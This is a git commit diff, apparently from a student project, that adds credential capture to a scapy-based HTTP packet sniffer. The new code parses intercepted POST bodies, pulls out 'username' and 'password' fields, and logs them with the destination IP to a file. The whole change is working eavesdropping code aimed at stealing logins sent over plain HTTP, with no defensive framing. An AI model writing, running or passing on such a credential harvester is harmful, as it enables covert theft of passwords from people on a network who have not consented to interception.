6717d2ae45ec66f4b829f67fc195355d46591d5a
zoligamer <kuruczzoltan2006@gmail.com>
2026-04-28 11:12:03 +0200

    04-28-packetsniffer

--- Pycharm-proj/info2/packetsniffer.py
+++ Pycharm-proj/info2/packetsniffer.py
@@ -1,5 +1,19 @@
-from scapy.all import sniff, get_if_list,Raw
+import logging
+from urllib.parse import parse_qs
+
+from scapy.all import sniff, get_if_list, Raw
 from scapy.layers.http import HTTPRequest
+from scapy.layers.inet import IP
+from scapy.layers.inet6 import IPv6
+
+
+logger=logging.getLogger("sniffer")
+logger.setLevel(logging.INFO)
+file_handler=logging.FileHandler("sniffer.log")
+file_handler.setLevel(logging.INFO)
+formater=logging.Formatter("%(message)s")
+file_handler.setFormatter(formater)
+logger.addHandler(file_handler)
 
 
 def packet_callback(packet):
@@ -10,6 +24,18 @@ def packet_callback(packet):
             if packet.haslayer(Raw):
                 post_data=packet[Raw].load.decode("utf-8",errors="ignore")
                 print(f"POST Data: {post_data}")
+                ip="N/A"
+                if packet.haslayer(IP):
+                    ip=packet[IP].dst
+                if packet.haslayer(IPv6):
+                    ip=packet[IPv6].dst
+
+                if "username" in post_data and "password" in post_data:
+                    form_data=parse_qs(post_data)
+                    user=form_data["username"]
+                    password=form_data["password"]
+                    msg=f"{ip} {user} {password}"
+                    logger.info(msg)
 
 if __name__=="__main__":
     print(get_if_list())
